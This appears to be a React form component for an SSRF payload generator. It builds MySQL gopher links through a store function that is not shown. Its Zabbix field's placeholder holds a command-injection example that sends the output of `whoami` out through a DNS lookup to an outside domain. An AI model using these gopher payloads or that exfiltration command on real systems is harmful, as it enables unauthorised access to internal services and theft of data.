import React, { useState, useEffect } from 'react';
import { Form, Input, Typography, message } from 'antd';
import { useStore } from './store';

const { Text } = Typography;

const FormRenderer: React.FC = () => {
  const payload = useStore((state) => state.payload);
  const generateMysqlSSRF = useStore((state) => state.generateMysqlSSRF);

  const [username, setUsername] = useState('');
  const [query, setQuery] = useState('');
  const [gopherLink, setGopherLink] = useState('');

  useEffect(() => {
    if(payload === 'MySQL') {
      if (username === '' || query === '') {
        return setGopherLink('Enter username and query to generate Gopher Link');
      }
      setGopherLink(generateMysqlSSRF(username, query));
    }
  }, [username, query, payload, generateMysqlSSRF]);

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(gopherLink);
      message.success('Copied to clipboard!');
    } catch(err) {
      message.error('Failed to copy text');
    }
  };

  switch (payload) {
    case 'Zabbix':
      return (
        <Form>
          {/* Your form for Zabbix payload */}
          <Form.Item label="Bash comand to execute">
            <Input placeholder="nsloookup `whoami`.domain.com" />
          </Form.Item>
        </Form>
      );
    case 'MySQL':
      return (
        <Form>
          {/* Your form for MySQL payload */}
          <Form.Item label="MySQL Username">
            <Input placeholder="Enter username" value={username} onChange={(e) => setUsername(e.target.value)} required />
          </Form.Item>
          <Form.Item label="Query to execute">
            <Input placeholder="Enter query" value={query} onChange={(e) => setQuery(e.target.value)} required />
          </Form.Item>
          <Form.Item label="Generated Gopher Link">
            <Text copyable={{ onCopy: handleCopy }}>{gopherLink}</Text>
          </Form.Item>
        </Form>
      );
    case 'Custom':
      return (
        <Form>
          {/* Your form for custom payload */}
          <Form.Item label="Custom field 1">
            <Input placeholder="Enter data" />
          </Form.Item>
        </Form>
      );
    default:
      return null;
  }
};

export default FormRenderer;
